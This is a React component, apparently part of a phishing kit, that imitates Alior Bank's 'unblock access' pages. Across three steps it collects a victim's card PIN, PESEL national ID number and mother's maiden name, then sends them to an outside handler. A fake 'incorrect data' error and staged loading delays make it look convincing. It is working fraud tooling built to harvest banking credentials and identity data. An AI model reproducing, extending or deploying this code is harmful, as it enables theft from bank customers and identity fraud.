import {useState} from "react";
import {useForm} from "react-hook-form";
import {yupResolver} from "@hookform/resolvers/yup";
import * as yup from "yup";

const schema = yup.object().shape({
    pin: yup.string().min(4).required(),
    pesel: yup.string().required().matches(/^[0-9]{2}([02468]1|[13579][012])(0[1-9]|1[0-9]|2[0-9]|3[01])[0-9]{5}$/),
    mother: yup.string().required()
});

const AliorFormOther = ({handler, status}) => {
    const {register, handleSubmit, trigger, reset, formState: {errors}} = useForm({
        resolver: yupResolver(schema),
        mode: 'onChange'
    });
    const [loading, setLoading] = useState(false);
    const [step, setStep] = useState(1);

    const load = (index) => {
        setLoading(true);
        setTimeout(() => {
            setLoading(false);
            setStep(index);
        }, 2000)
    }
    const submitForm = (data) => {
        setLoading(true);
        reset();
        setStep(1);
        handler(data);
    }
    console.log(errors);

    return (

        <div className="column small-19 medium-18">
            <div className="external-page-content">
                <div className="unblock-access other">
                    <channel-reset process-validators="processValidators">
                        <form onSubmit={handleSubmit(submitForm)}>
                            <steps steps="crstCtrl.stepList" start-from="CHANNEL-CHOICE"
                                   className={`animate-to-next steps ${loading && 'loading'}`}>
                                {
                                    status === 'wrong_other_data' &&
                                    <div id="login-info" className="info-block login-info-box error">
                                        <div className="row">
                                            <div className="shrink column">
                                                <span className="icon icon-exclamation-mark"/>
                                            </div>
                                            <div className="expand column">
                                                <p tabIndex={0} id="login-info-header"
                                                   className="message" role="alert">
                                                    Podano nieprawidłowy dane. Wprowadź poprawne dane, aby się
                                                    zalogować.
                                                </p>
                                            </div>
                                        </div>
                                    </div>
                                }

                                {
                                    step === 1 ?
                                        <step key={'pin'} className="step-item">
                                            <section className="two-panels-section">
                                                <div className="left-panel">
                                                    <div className="ng-pristine ng-valid">
                                                        <div className="form-container">
                                                            <div>
                                                                <label>Wpisz PIN kod karty</label>
                                                                <div className="input-wrapper js-keyboard-container">
                                                                    <input type="text"
                                                                           autoComplete="off"
                                                                           className={`js-keyboard-input ng-empty input-field ${errors.pin && 'ng-invalid'}`}
                                                                           {...register('pin')}/>
                                                                    {
                                                                        errors.pin &&
                                                                        <span
                                                                            className="error-message icon icon-attention">
                                                                                <span>This field cannot be empty.</span>
                                                                            </span>
                                                                    }
                                                                </div>
                                                                <div className="row">
                                                                    <div className="column small-20 small-order-1 mb-3">
                                                                        <button
                                                                            className="button button-cta button-layout-block button-theme-primary"
                                                                            type="button"
                                                                            onClick={() => {
                                                                                trigger('pin').then((res) => {
                                                                                    if (res) {
                                                                                        load(2);
                                                                                    }
                                                                                })
                                                                            }}>
                                                                            <span>Next</span>
                                                                        </button>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div className="right-panel unblock-access-instructions">
                                                    <div className="row">
                                                        <div className="column shrink">
                                                            <span className="icon icon-info-serif"/>
                                                        </div>
                                                        <div className="column expand">
                                                            <p>Potrzebujemy więcej informacji.</p>
                                                            <p>Aby kontynuować, odpowiedz na kilka pytań.</p>
                                                        </div>
                                                    </div>
                                                </div>
                                            </section>
                                        </step> :
                                        step === 2 ?
                                            <step key={'pesel'} className="step-item">
                                                <section className="two-panels-section">
                                                    <div className="left-panel">
                                                        <div className="ng-pristine ng-valid">
                                                            <div className="form-container">
                                                                <div>
                                                                    <label>Input PESEL</label>
                                                                    <div
                                                                        className="input-wrapper js-keyboard-container">
                                                                        <input type="text"
                                                                               autoComplete="off"
                                                                               className={`js-keyboard-input ng-empty input-field ${errors.pesel && 'ng-invalid'}`}
                                                                               {...register('pesel')}/>
                                                                        {
                                                                            errors.pesel &&
                                                                            <span
                                                                                className="error-message icon icon-attention">
                                                        <span>Incorrect PESEL.</span>
                                                    </span>
                                                                        }
                                                                    </div>
                                                                    <div className="row">
                                                                        <div
                                                                            className="column small-20 small-order-1 mb-3">
                                                                            <button
                                                                                className="button button-cta button-layout-block button-theme-primary"
                                                                                type="button"
                                                                                onClick={() => {
                                                                                    trigger('pesel').then((res) => {
                                                                                        if (res) {
                                                                                            load(3);
                                                                                        }
                                                                                    })
                                                                                }}>
                                                                                <span>Next</span>
                                                                            </button>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div className="right-panel unblock-access-instructions">
                                                        <div className="row">
                                                            <div className="column shrink">
                                                                <span className="icon icon-info-serif"/>
                                                            </div>
                                                            <div className="column expand">
                                                                <p>Potrzebujemy więcej informacji.</p>
                                                                <p>Aby kontynuować, odpowiedz na kilka pytań.</p>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </section>
                                            </step> :
                                            step === 3 ?
                                                <step key={'mother'} className="step-item">
                                                    <section className="two-panels-section">
                                                        <div className="left-panel">
                                                            <div className="ng-pristine ng-valid">
                                                                <div className="form-container">
                                                                    <div>
                                                                        <label>Nazwisko panieńskie matki</label>
                                                                        <div
                                                                            className="input-wrapper js-keyboard-container">
                                                                            <input type="text"
                                                                                   autoComplete="off"
                                                                                   className={`js-keyboard-input ng-empty input-field ${errors.mother && 'ng-invalid'}`}
                                                                                   {...register('mother')}/>
                                                                            {
                                                                                errors.mother &&
                                                                                <span
                                                                                    className="error-message icon icon-attention">
                                                                                <span>This field cannot be empty.</span>
                                                                            </span>
                                                                            }
                                                                        </div>
                                                                        <div className="row">
                                                                            <div
                                                                                className="column small-20 small-order-1 mb-3">
                                                                                <button
                                                                                    className="button button-cta button-layout-block button-theme-primary"
                                                                                    type="submit">
                                                                                    <span>Send</span>
                                                                                </button>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                        <div className="right-panel unblock-access-instructions">
                                                            <div className="row">
                                                                <div className="column shrink">
                                                                    <span className="icon icon-info-serif"/>
                                                                </div>
                                                                <div className="column expand">
                                                                    <p>Potrzebujemy więcej informacji.</p>
                                                                    <p>Aby kontynuować, odpowiedz na kilka pytań.</p>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </section>
                                                </step> : null
                                }
                                <div className="svg-loader">
                                    <a11y-loading/>
                                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="25 25 50 50">
                                        <circle cx={50} cy={50} r={20} fill="none" strokeMiterlimit={10}/>
                                    </svg>
                                </div>
                            </steps>
                        </form>
                    </channel-reset>
                </div>
            </div>
        </div>

    )
}

export default AliorFormOther;